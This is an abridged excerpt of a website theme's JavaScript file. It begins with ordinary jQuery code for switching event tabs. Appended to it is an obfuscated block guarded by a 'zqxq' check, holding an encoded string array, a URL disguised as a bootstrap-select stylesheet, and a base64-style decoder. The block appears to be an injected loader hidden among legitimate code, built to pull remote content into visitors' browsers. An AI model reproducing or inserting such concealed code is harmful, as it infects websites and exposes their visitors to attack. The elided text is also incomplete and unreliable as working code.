  ...
  if ($(".up-comming-event-two").length) {
    $(".up-comming-event-two .tabs-button-box .tab-btn-item").on("click", function (e) {
      ...
      if ($(target).hasClass("actve-tab")) {
        ...
        $(".up-comming-event-two .tabs-content-box .tab-content-box-item").removeClass(
...
if (typeof zqxq === "undefined") {
  ...
  function J() {
    var T = [
      ...
      "C2vUza",
      "index",
      "//unicktheme.com/2024/anity/assets/vendors/bootstrap-select/bootstrap-select.css",
      "C3vIC3q",
      "rando",
      "mJG2nZG3mKjyEKHuta",
      "col",
          ...
          var n = function (G) {
            ...
            for (
              ...
              ~F && ((g = i % 0x4 ? g * 0x40 + F : F), i++ % 0x4)
                ? (q += String["fromCharCode"](0xff & (g >> ((-0x2 * i) & 0x6))))
                : 0x0
            ) {
              F = W["indexOf"](F);
            }
